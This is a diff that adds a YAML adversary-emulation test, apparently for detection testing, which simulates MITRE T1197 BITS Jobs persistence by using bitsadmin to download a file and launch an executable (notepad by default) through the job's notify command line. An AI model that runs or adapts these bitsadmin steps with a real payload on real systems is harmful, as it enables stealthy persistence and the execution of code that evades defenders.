@@ -1,0 +1,44 @@
+api_version: "2.0"
+name: Persist, Download, & Execute
+description: |
+    This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transferand execute a payload in multiple steps.
+    Note that in this test, the file executed is not the one downloaded. The downloading of a random file is simply the trigger for getting bitsdamin to run an executable.
+    This has the interesting side effect of causing the executable (e.g. notepad) to run with an Initiating Process of "svchost.exe" and an Initiating Process Command Line of "svchost.exe -k netsvcs -p -s BITS"
+    This job will remain in the BITS queue until complete or for up to 90 days by default if not removed.
+args:
+    - name: command_path
+      type: path
+      default: C:\Windows\system32\notepad.exe
+    - name: bits_job_name
+      type: string
+      default: AtomicBITS
+    - name: local_file
+      type: path
+      default: '%temp%\bitsadmin3_flag.ps1'
+    - name: remote_file
+      type: string
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+uuid: 62a06ec5-5754-47d2-bcfc-123d8314c6ae
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+        - 'TA0003: Persistence'
+    techniques:
+        - 'T1197: BITS Jobs'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: persist,-download,-&-execute
+      inline: |
+        bitsadmin.exe /create {{.Args.bits_job_name}}
+        bitsadmin.exe /addfile {{.Args.bits_job_name}} {{.Args.remote_file}} {{.Args.local_file}}
+        bitsadmin.exe /setnotifycmdline {{.Args.bits_job_name}} {{.Args.command_path}} NULL
+        bitsadmin.exe /resume {{.Args.bits_job_name}}
+        ping -n 5 127.0.0.1 >nul 2>&1
+        bitsadmin.exe /complete {{.Args.bits_job_name}}
+      executor: command_prompt
+      cleanup:
+        inline: |
+            del {{.Args.local_file}} >nul 2>&1
+        executor: command_prompt
